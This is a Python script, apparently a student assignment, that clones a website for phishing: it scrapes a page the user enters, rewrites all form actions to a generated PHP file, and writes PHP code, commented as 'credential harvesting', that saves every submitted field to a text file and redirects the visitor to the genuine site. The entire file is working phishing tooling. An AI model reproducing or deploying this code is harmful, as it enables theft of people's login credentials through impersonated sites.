# Kenny Almanza
# CPSC 2030
# 03-03-23


# _   _       __ _         
#| | | | ___ / _| |_ _   _ 
#| |_| |/ _ \ |_| __| | | |
#|  _  |  __/  _| |_| |_| |
#|_| |_|\___|_|  \__|\__, |
#                    |___/ 


from codecs import utf_8_encode
import requests
from bs4 import BeautifulSoup
import subprocess
from urllib.parse import urlparse

# Generic php code I found online for credential harvesting
dat_code_for_duh_phpfile = "<?php\n" + \
    "$file = fopen(\"whats-love-got-to-do-with-it.txt\", \"a\");\n" + \
    "fwrite($file, \"\t\t\t\t\t\t\");\n" + \
    "fwrite($file, \"\r\n\");\n" + \
    "foreach($_POST as $key=>$value) {\n" + \
    "    fwrite($file, \"\t\t\t\t\t\t\");\n" + \
    "    fwrite($file, $key);\n" + \
    "    fwrite($file, \"=\");\n" + \
    "    fwrite($file, $value);\n" + \
    "    fwrite($file, \"\r\n\");\n" + \
    "}\n" + \
    "fwrite($file, \"\r\n\");\n" + \
    "fwrite($file, \"\t\t\t\t\t\t\");\n" + \
    "fclose($file);\n" + \
    "header(\"Location: https://www.facebook.com\");\n" + \
    "die();\n" + \
    "?>"


# Gets the website the user inputed and scrapes all the html code
print("Enter website as https:/example.com")
user_request = input("Enter Website to Scrape: ")
response = requests.get(user_request)
html = response.text
print(html) # Prints the html code to the user so the user can see what they scraped


# Takes the user input and edits the php code above 
php_file_location= dat_code_for_duh_phpfile.partition("Location:")[2]
php_filename = php_file_location.partition('")')[0]
real_new = php_filename.strip()
newer_string = dat_code_for_duh_phpfile.replace(real_new,user_request)


# Gets the name of the company for the sake of file naming
find_url_name = urlparse(user_request).netloc
if "www" in find_url_name:
    company_name = find_url_name.split("www.")[1]
else:
    company_name = find_url_name.split(".")[0]


# Creates html and php files
scraped_website = f"fake{company_name}.html"
php_file =f" fake{company_name}.php"
php_wit_noSpace = php_file.replace(" ","")
random_thing = ("/", php_wit_noSpace)
add_slash = "".join(random_thing)
phpfile_slash_noSpace = add_slash.strip()


# Finds all the action attributes in the html code and changes thme to the php file we just created
soup = BeautifulSoup(html, "html.parser")
for tag in soup.find_all(True):
    if "action" in tag.attrs:
        tag.attrs["action"] = phpfile_slash_noSpace

# Opens the html and php file and writes to it
with open(scraped_website, "w", encoding="utf-8") as file:
    file.write(str(soup))   # Our modified html code gets put into the html file

# Writes the generic php code and adds it to a php file
with open(php_file, "w") as f:
    f.write(newer_string)


# Just for testing purposes
print(find_url_name)
print(add_slash)




